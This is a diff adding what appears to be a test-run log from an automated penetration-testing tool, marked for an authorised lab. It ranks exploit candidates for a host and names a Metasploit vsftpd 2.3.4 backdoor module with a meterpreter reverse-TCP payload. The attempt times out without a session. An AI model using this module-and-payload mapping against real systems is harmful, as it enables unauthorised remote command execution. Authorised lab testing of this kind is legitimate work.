@@ -1,0 +1,44 @@
+========================================
+        METASPLOIT EXPLOITATION
+          (authorized lab only)
+========================================
+
+[*] Target:   203.0.113.73
+[*] Findings: /home/kali/security-assessment/tests/runs/20260923_100837/t73/src
+
+Available exploit candidates:
+----------------------------------------
+[1] 21   high   vsftpd 2.3.4  [high/high]  EDB-17491 (EXACT_VERSION_MATCH)
+      vsftpd 2.3.4 - Backdoor Command Execution
+[2] 139  medium Samba smbd 3.0.20-Debian  [medium/medium]  EDB-16320 (VERSION_RANGE_MATCH)
+      Samba 3.0.20 < 3.0.25rc3 - Username map script Command Execution
+[3] 8009 medium Apache Jserv 1.2  [medium/medium]  EDB-30004 (STRONG_PRODUCT_SERVICE_MATCH)
+      Apache Jserv Remote Buffer Overflow
+----------------------------------------
+[*] Candidate index given: selecting candidate 1.
+
+[+] Selected: vsftpd 2.3.4 - Backdoor Command Execution (vsftpd 2.3.4, port 21)
+    Service: ftp | Confidence: high | Match: EXACT_VERSION_MATCH | EDB-17491
+
+[*] Metasploit module: exploit/unix/ftp/vsftpd_234_backdoor
+[*] Payload:          cmd/unix/interact
+[*] Mapping note:     vsftpd 2.3.4 backdoor (classic MS2 lab)
+
+[*] Metasploit build probe:
+    payload 'cmd/unix/interact' -> not accepted; using module default 'cmd/linux/http/x86/meterpreter_reverse_tcp'
+    LHOST -> not required
+    ExitOnSession -> not supported; option will not be sent
+
+[*] Launching Metasploit (bounded to 3s) - evidence is collected through the same live session...
+[!] Metasploit run exceeded 3s - recorded as timeout, not success.
+
+[*] Raw Metasploit output saved:
+    /home/kali/security-assessment/tests/runs/20260923_100837/t73/exploit/203.0.113.73_20260923_100841420833941/exploit_output.txt
+
+----------------------------------------
+Last lines of Metasploit output:
+----------------------------------------
+
+[-] No session was created - exploitation did not succeed.
+    (Possible failure, timeout, or the module requires interaction.)
+[-] Output directory: /home/kali/security-assessment/tests/runs/20260923_100837/t73/exploit/203.0.113.73_20260923_100841420833941
